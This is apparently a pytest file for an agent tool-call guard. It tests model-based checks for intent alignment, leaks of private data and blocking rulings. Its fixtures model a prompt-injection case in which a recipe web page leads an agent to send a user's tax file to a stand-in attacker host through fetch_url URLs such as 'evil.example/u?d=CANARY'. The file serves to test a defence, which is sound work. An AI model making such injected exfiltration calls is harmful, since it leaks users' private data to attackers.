import json

import httpx
import pytest
from openai import APITimeoutError

from fakes.openai_client import FakeClient, completion, json_reply
from tripwire.classifier import NemotronClassifier
from tripwire.decision import Decision, Verdict
from tripwire.events import EventBus
from tripwire.gateway import Gateway, JudgeCase
from tripwire.judge import FALLBACK_EXPLANATION, NemotronJudge
from tripwire.labels import BOTTOM, CallRecord, TurnContext, file_label, join, user_label, web_label
from tripwire.policy.engine import PolicyEngine, call_facts
from tripwire.tools import ToolCall, build_default_registry

TIMEOUT = APITimeoutError(request=httpx.Request("POST", "https://x"))
SEND = ToolCall("send_telegram", {"text": "brief"})
FACTS = call_facts("send_telegram", "outbound", "self", join(user_label(), web_label("https://a.example")), BOTTOM)


def user_payload(client, i=0):
    return json.loads(client.requests[i]["messages"][1]["content"])


# --- classifier: ALIGN -------------------------------------------------------


def test_align_parses_answer_and_uses_nano_without_reasoning(make_router):
    client = FakeClient([json_reply({"aligned": True, "confidence": 0.93, "reason": "user asked for a brief"})])
    intent = NemotronClassifier(make_router(client)).classify(SEND, "send me a brief", FACTS)
    assert (intent.aligned, intent.confidence, intent.rationale) == (True, 0.93, "user asked for a brief")
    req = client.requests[0]
    assert req["model"] == "nvidia/nano-test"
    assert req["temperature"] == 0
    assert req["extra_body"]["chat_template_kwargs"]["enable_thinking"] is False
    assert req["response_format"]["json_schema"]["schema"]["required"] == ["aligned", "confidence", "reason"]
    payload = user_payload(client)
    assert payload["user_instruction"] == "send me a brief"
    assert payload["proposed_call"]["tool"] == "send_telegram"
    assert payload["proposed_call"]["destination"] == "self"


@pytest.mark.parametrize(
    "reply",
    [
        completion("Yes, looks aligned to me."),
        json_reply({"aligned": "yes", "confidence": 1, "reason": "x"}),
        json_reply({"confidence": 1, "reason": "x"}),
        TIMEOUT,
    ],
)
def test_align_fails_closed(make_router, reply):
    client = FakeClient([reply] * 4)
    intent = NemotronClassifier(make_router(client)).classify(SEND, "send me a brief", FACTS)
    assert intent.aligned is False


def test_align_clamps_confidence(make_router):
    client = FakeClient([json_reply({"aligned": False, "confidence": 7, "reason": "no"})])
    assert NemotronClassifier(make_router(client)).classify(SEND, "x", FACTS).confidence == 1.0


def test_align_truncates_huge_args(make_router):
    client = FakeClient([json_reply({"aligned": False, "confidence": 1, "reason": "no"})])
    call = ToolCall("send_telegram", {"text": "x" * 10_000})
    NemotronClassifier(make_router(client)).classify(call, "x", FACTS)
    assert len(user_payload(client)["proposed_call"]["args"]) <= 1500


# --- classifier: LEAK --------------------------------------------------------

SEARCH_FACTS = call_facts("tavily_search", "none", None, join(user_label(), file_label("/t")), BOTTOM, egress=True)
TAX = "Name: Riya Kapoor\nPAN: ABCPK1234F\nGross income: 18,40,000\nCANARY-T4X9"


def test_leak_deterministic_hit_skips_model(make_router):
    client = FakeClient([])
    leak = NemotronClassifier(make_router(client)).check_leak(
        ToolCall("tavily_search", {"query": "is PAN ABCPK1234F valid"}), [TAX], SEARCH_FACTS
    )
    assert leak.leaking is True and "abcpk1234f" in leak.rationale
    assert client.requests == []


def test_leak_asks_model_for_softer_specifics(make_router):
    client = FakeClient([json_reply({"matches": ["Riya Kapoor"], "leaking": True, "reason": "contains a name"})])
    leak = NemotronClassifier(make_router(client)).check_leak(
        ToolCall("tavily_search", {"query": "Riya Kapoor tax refund"}), [TAX], SEARCH_FACTS
    )
    assert leak.leaking is True and "Riya Kapoor" in leak.rationale
    payload = user_payload(client)
    assert payload["private_excerpts"] == [TAX]
    assert payload["outbound_text"] == "Riya Kapoor tax refund"
    assert client.requests[0]["extra_body"]["chat_template_kwargs"]["enable_thinking"] is False


def test_leak_topic_search_passes(make_router):
    client = FakeClient([json_reply({"matches": [], "leaking": False, "reason": "general topic"})])
    leak = NemotronClassifier(make_router(client)).check_leak(
        ToolCall("tavily_search", {"query": "income tax filing deadline India"}), [TAX], SEARCH_FACTS
    )
    assert leak.leaking is False


def test_leak_caps_private_excerpts(make_router):
    client = FakeClient([json_reply({"matches": [], "leaking": False, "reason": "ok"})])
    NemotronClassifier(make_router(client)).check_leak(
        ToolCall("tavily_search", {"query": "weather"}), ["a" * 5000, "b" * 5000, "c" * 5000], SEARCH_FACTS
    )
    assert sum(len(e) for e in user_payload(client)["private_excerpts"]) <= 6000


def test_leak_ungrounded_claim_is_not_a_leak(make_router):
    """The model says 'leaking' but names things that aren't in the query."""
    client = FakeClient([json_reply({"matches": ["ABCPK1234F", "Riya Kapoor"], "leaking": True, "reason": "PAN"})])
    leak = NemotronClassifier(make_router(client)).check_leak(
        ToolCall("tavily_search", {"query": "income tax refund timeline India"}), [TAX], SEARCH_FACTS
    )
    assert leak.leaking is False


@pytest.mark.parametrize("reply", [completion("not sure"), TIMEOUT, json_reply({"leaking": True, "reason": "x"})])
def test_leak_fails_closed(make_router, reply):
    leak = NemotronClassifier(make_router(FakeClient([reply] * 4))).check_leak(
        ToolCall("tavily_search", {"query": "weather"}), [TAX], SEARCH_FACTS
    )
    assert leak.leaking is True


# --- judge -------------------------------------------------------------------


def make_case(history=()):
    escalation = Decision(Verdict.ESCALATE, "R1.untrusted_side_effect", "not requested")
    data = join(user_label(), web_label("https://evil-recipes.example"), file_label("/tax.txt"))
    call = ToolCall("fetch_url", {"url": "https://evil.example/u?d=CANARY"})
    facts = call_facts("fetch_url", "outbound", "external", data, BOTTOM, egress=True)
    return JudgeCase(call, "find me a pasta recipe", facts, escalation, list(history), data)


def test_judge_parses_ruling_with_reasoning_on(make_router):
    reply = {
        "verdict": "BLOCK",
        "explanation": "A recipe website tried to make the assistant upload your tax file to a stranger's server.",
        "evidence": "https://evil-recipes.example",
    }
    client = FakeClient([json_reply(reply)])
    ruling = NemotronJudge(make_router(client)).judge(make_case())
    assert ruling.verdict is Verdict.BLOCK
    assert ruling.explanation.startswith("A recipe website")
    assert ruling.evidence == "https://evil-recipes.example"
    req = client.requests[0]
    assert req["model"] == "nvidia/ultra-test"
    assert req["extra_body"]["chat_template_kwargs"]["enable_thinking"] is True
    assert req["max_tokens"] >= 4096
    assert req["response_format"]["json_schema"]["schema"]["properties"]["verdict"]["enum"] == ["BLOCK", "NEEDS_APPROVAL"]


def test_judge_sees_history_labels_and_rule(make_router):
    client = FakeClient([json_reply({"verdict": "NEEDS_APPROVAL", "explanation": "ok", "evidence": "x"})])
    record = CallRecord(
        "c1", "tavily_extract", {"urls": ["https://evil-recipes.example"]}, "none", None, user_label(),
        Decision(Verdict.ALLOW, "R4", "r"), output_label=web_label("https://evil-recipes.example"),
    )
    NemotronJudge(make_router(client)).judge(make_case([record]))
    payload = user_payload(client)
    assert payload["user_instruction"] == "find me a pasta recipe"
    assert payload["history_this_turn"][0]["output_untrusted"] is True
    assert payload["proposed_call"]["carries_private_data"] is True
    assert "web:https://evil-recipes.example" in payload["proposed_call"]["data_sources"]
    assert payload["flagged_by"]["rule"] == "R1.untrusted_side_effect"


@pytest.mark.parametrize(
    "reply",
    [
        json_reply({"verdict": "ALLOW", "explanation": "fine", "evidence": "x"}),
        json_reply({"verdict": "BLOCK", "explanation": "", "evidence": "x"}),
        completion("I would block this."),
        TIMEOUT,
    ],
)
def test_judge_never_allows_and_blocks_on_bad_output(make_router, reply):
    ruling = NemotronJudge(make_router(FakeClient([reply] * 4))).judge(make_case())
    assert ruling.verdict is Verdict.BLOCK
    assert ruling.explanation == FALLBACK_EXPLANATION
    assert ruling.evidence == "web:https://evil-recipes.example"


def test_judge_uses_super_when_ultra_missing(make_router, settings):
    from dataclasses import replace

    s = replace(settings, models={"nano": "n", "super": "nvidia/super-test"})
    client = FakeClient([json_reply({"verdict": "BLOCK", "explanation": "no", "evidence": "x"})])
    judge = NemotronJudge(make_router(client, settings=s))
    assert judge.tier == "super"
    judge.judge(make_case())
    assert client.requests[0]["model"] == "nvidia/super-test"


# --- through the gateway -----------------------------------------------------


def test_gateway_with_nemotron_classifier_and_judge(make_router):
    """Misaligned call: Nano says no, Ultra blocks with an explanation that reaches the event."""

    def respond(req):
        if req["model"] == "nvidia/nano-test":
            return json_reply({"aligned": False, "confidence": 0.97, "reason": "user never asked to visit evil.example"})
        return json_reply(
            {"verdict": "BLOCK", "explanation": "A web page tried to send your data to evil.example.",
             "evidence": "https://evil-recipes.example"}
        )

    bus = EventBus()
    router = make_router(FakeClient(respond), bus=bus)
    gateway = Gateway(
        build_default_registry("1"), PolicyEngine.from_yaml(), NemotronClassifier(router), NemotronJudge(router), bus
    )
    ctx = TurnContext("find me a pasta recipe")
    gateway.call(ToolCall("tavily_extract", {"urls": ["https://evil-recipes.example"]}), ctx)
    d = gateway.check(ToolCall("fetch_url", {"url": "https://evil.example/collect"}), ctx)
    assert d.verdict is Verdict.BLOCK and d.policy_verdict is Verdict.ESCALATE
    assert d.models == ("nano", "ultra")
    assert d.explanation == "A web page tried to send your data to evil.example."
    assert d.evidence == "https://evil-recipes.example"
    decision_event = [e for e in bus.recent if e.kind == "decision"][-1]
    assert decision_event.explanation == d.explanation
    assert [e.tier for e in bus.recent if e.kind == "model_call"] == ["nano", "ultra"]
